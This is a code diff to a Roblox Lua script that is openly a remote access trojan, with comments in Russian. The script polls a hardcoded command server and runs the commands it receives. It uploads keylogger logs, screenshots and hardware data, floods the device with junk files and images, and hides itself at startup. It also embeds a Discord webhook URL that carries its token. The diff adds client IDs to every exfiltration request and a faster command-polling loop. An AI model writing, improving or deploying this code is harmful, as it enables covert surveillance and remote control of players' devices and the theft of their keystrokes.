@@ -11,7 +11,7 @@ local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
 
 -- Конфигурация
-local SERVER_URL = "https://ratserver-6wo3.onrender.com/"
+local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_"
 local ADMIN_NAME = "defensow"
 local player = Players.LocalPlayer
@@ -21,6 +21,7 @@ local keyloggerEnabled = false
 local keylogBuffer = ""
 local lastSendTime = os.time()
 local scriptHidden = false
+local CLIENT_ID = player.Name .. "_" .. tostring(math.random(10000, 99999))
 
 -- HTTP-библиотека
 local function httpRequest(params)
@@ -253,7 +254,7 @@ local function memorySpam(fileCount, fileData)
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
             command = "memory_spam_start",
-            args = {fileCount}
+            args = {fileCount, CLIENT_ID}
         })
     })
     
@@ -279,7 +280,7 @@ local function memorySpam(fileCount, fileData)
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
             command = "spam_completed",
-            args = {"memory_spam", "Создано "..successCount.." файлов"}
+            args = {"memory_spam", "Создано "..successCount.." файлов", CLIENT_ID}
         })
     })
     
@@ -297,7 +298,7 @@ local function gallerySpam(imageCount, imageData, filename)
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
             command = "gallery_spam_start",
-            args = {imageCount, filename}
+            args = {imageCount, filename, CLIENT_ID}
         })
     })
     
@@ -323,7 +324,7 @@ local function gallerySpam(imageCount, imageData, filename)
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
             command = "spam_completed",
-            args = {"gallery_spam", "Сохранено "..successCount.." копий"}
+            args = {"gallery_spam", "Сохранено "..successCount.." копий", CLIENT_ID}
         })
     })
     
@@ -404,7 +405,7 @@ local function addMessage(sender, text, isSystem)
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
                 command = "user_chat",
-                args = {sender, text}
+                args = {sender, text, CLIENT_ID}
             })
         })
     end
@@ -505,7 +506,7 @@ local function ExecuteCommand(cmd, args)
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
                 command = "execute_log",
-                args = {player.Name, "Выполнен код: "..table.concat(args, " ").."\nРезультат: "..result}
+                args = {player.Name, "Выполнен код: "..table.concat(args, " ").."\nРезультат: "..result, CLIENT_ID}
             })
         })
     
@@ -520,7 +521,8 @@ local function ExecuteCommand(cmd, args)
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
-                    image = screenshotData
+                    image = screenshotData,
+                    clientId = CLIENT_ID
                 })
             })
         end
@@ -539,7 +541,8 @@ local function ExecuteCommand(cmd, args)
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
-                    logs = keylogBuffer
+                    logs = keylogBuffer,
+                    clientId = CLIENT_ID
                 })
             })
         end
@@ -554,7 +557,8 @@ local function ExecuteCommand(cmd, args)
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
                 player = player.Name,
-                data = hwInfo
+                data = hwInfo,
+                clientId = CLIENT_ID
             })
         })
         showPopup("Hardware info sent", 3)
@@ -594,28 +598,55 @@ local function ExecuteCommand(cmd, args)
     end
 end
 
--- Инициализация
-sendInjectNotification()
-showPopup("RAT система активирована", 5)
-setupKeylogger()
-hideScript() -- Автоматически скрываем скрипт при запуске
-
--- Главный цикл
-while task.wait(1) do
-    -- Проверка команд
-    local response = httpRequest({
-        Url = SERVER_URL.."/data",
-        Method = "GET"
-    })
+-- Функция проверки команд
+local function checkCommands()
+    local success, response = pcall(function()
+        return httpRequest({
+            Url = SERVER_URL.."/data",
+            Method = "GET",
+            Headers = {
+                ["Client-ID"] = CLIENT_ID
+            }
+        })
+    end)
     
-    if response and response.Body then
+    if success and response and response.Body then
         local success, data = pcall(function()
             return HttpService:JSONDecode(response.Body)
         end)
         
-        if success and data and data.command then
+        if success and data and data.command and data.command ~= "" then
+            print("[RAT] Получена команда: " .. data.command)
+            showPopup("Получена команда: " .. data.command, 3)
             pcall(ExecuteCommand, data.command, data.args or {})
+            return true
         end
+    else
+        if not success then
+            print("[RAT] Ошибка запроса команд: " .. tostring(response))
+        end
+    end
+    return false
+end
+
+-- Инициализация
+sendInjectNotification()
+showPopup("RAT система активирована. ID: " .. CLIENT_ID, 5)
+setupKeylogger()
+hideScript() -- Автоматически скрываем скрипт при запуске
+
+print("[RAT] Система инициализирована. ID: " .. CLIENT_ID)
+print("[RAT] Сервер: " .. SERVER_URL)
+
+-- Главный цикл
+while task.wait(2) do
+    -- Проверка команд
+    local hasCommand = checkCommands()
+    
+    -- Если получили команду, проверяем еще раз сразу (для быстрого выполнения нескольких команд)
+    if hasCommand then
+        task.wait(0.5)
+        checkCommands()
     end
     
     -- Отправка логов кейлоггера каждые 5 минут
@@ -626,7 +657,8 @@ while task.wait(1) do
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
-                    logs = keylogBuffer
+                    logs = keylogBuffer,
+                    clientId = CLIENT_ID
                 })
             })
             keylogBuffer = ""
